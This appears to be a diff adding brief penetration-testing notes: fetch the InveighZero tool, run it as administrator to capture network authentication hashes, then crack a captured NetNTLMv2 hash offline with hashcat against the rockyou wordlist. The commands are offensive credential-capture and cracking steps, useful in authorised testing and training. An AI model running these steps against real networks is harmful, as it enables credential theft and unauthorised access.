@@ -1,0 +1,12 @@
+#Download Inveigh here:
+https://github.com/Kevin-Robertson/InveighZero
+
+#Run Inveigh.exe as Admin
+Inveigh.exe
+
+#Send password offline for cracking
+hashcat -m 5600 hadams.txt rockyou.txt
+
+-m = hash module
+hadams.txt = File containing the hash
+rockyou.txt = the wordlist
